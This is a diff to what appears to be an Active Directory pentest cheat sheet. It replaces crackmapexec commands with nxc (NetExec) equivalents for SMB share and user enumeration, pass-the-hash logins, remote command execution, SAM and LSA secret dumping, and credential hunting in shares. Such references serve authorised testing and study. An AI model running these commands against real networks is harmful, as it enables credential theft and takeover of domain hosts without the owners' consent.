@@ -56,9 +56,12 @@ smbclient -L //$DC_IP -U ''%''
 
 smbclient -U 'DOMAIN/$USER%$PASS' //$DC_IP/SHARED-NAME
 
+smbclient --realm=corp.local 
+
 # Enumerate shares
-crackmapexec smb $DC_IP -u '' -p '' --shares
-netexec smb $DC_IP -u '' -p '' --shares
+# Use -k with krb5.conf
+nxc smb $DC_IP -u '' -p '' --shares
+nxc smb $DC_IP -u '' -p '' --shares
 
 # Nmap AD scripts
 nmap -sV -p 88,389,445,464,636,3268,3269 --script 'ldap*,smb*,krb5*' $DC_IP
@@ -148,47 +151,48 @@ ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
 
 ```bash
 # Basic authentication check
-crackmapexec smb $DC_IP -u $USER -p $PASS
-crackmapexec smb $DC_IP -u $USER -H $HASH      # PtH
+nxc smb $DC_IP -u $USER -p $PASS
+nxc smb $DC_IP -u $USER -H $HASH      # PtH
 
 # Enumerate shares
-crackmapexec smb $DC_IP -u $USER -p $PASS --shares
+nxc smb $DC_IP -u $USER -p $PASS --shares
+nxc smb $DC_IP -u $USER -p $PASS --shares -k 
 
 # Enumerate users, groups, computers
-crackmapexec smb $DC_IP -u $USER -p $PASS --users
-crackmapexec smb $DC_IP -u $USER -p $PASS --groups
-crackmapexec smb $DC_IP -u $USER -p $PASS --computers
+nxc smb $DC_IP -u $USER -p $PASS --users
+nxc smb $DC_IP -u $USER -p $PASS --groups
+nxc smb $DC_IP -u $USER -p $PASS --computers
 
 # Enumerate logged-on users (requires local admin)
-crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS --loggedon-users
+nxc smb 10.10.10.0/24 -u $USER -p $PASS --loggedon-users
 
 # Enumerate local admins
-crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS --local-groups Administrators
+nxc smb 10.10.10.0/24 -u $USER -p $PASS --local-groups Administrators
 
 # Password policy
-crackmapexec smb $DC_IP -u $USER -p $PASS --pass-pol
+nxc smb $DC_IP -u $USER -p $PASS --pass-pol
 
 # Run commands
-crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS -x 'whoami /all'
-crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS -X 'Get-Process'   # PowerShell
+nxc smb 10.10.10.0/24 -u $USER -p $PASS -x 'whoami /all'
+nxc smb 10.10.10.0/24 -u $USER -p $PASS -X 'Get-Process'   # PowerShell
 
 # Dump SAM (local admin required)
-crackmapexec smb TARGET_IP -u $USER -p $PASS --sam
+nxc smb TARGET_IP -u $USER -p $PASS --sam
 
 # Dump LSA secrets
-crackmapexec smb TARGET_IP -u $USER -p $PASS --lsa
+nxc smb TARGET_IP -u $USER -p $PASS --lsa
 
 # WinRM check
-crackmapexec winrm 10.10.10.0/24 -u $USER -p $PASS
+nxc winrm 10.10.10.0/24 -u $USER -p $PASS
 
 # MSSQL enum
-crackmapexec mssql $DC_IP -u $USER -p $PASS --sql-query 'SELECT @@version'
+nxc mssql $DC_IP -u $USER -p $PASS --sql-query 'SELECT @@version'
 
 # Spider shares for juicy files
-crackmapexec smb $DC_IP -u $USER -p $PASS -M spider_plus -o OUTPUT_FOLDER=/tmp/spider
+nxc smb $DC_IP -u $USER -p $PASS -M spider_plus -o OUTPUT_FOLDER=/tmp/spider
 
 # Grep for credentials in shares
-crackmapexec smb $DC_IP -u $USER -p $PASS -M spider_plus \
+nxc smb $DC_IP -u $USER -p $PASS -M spider_plus \
     -o INCLUDE_EXTENSIONS=txt,conf,config,ini,xml,ps1,bat,sh
 ```
 
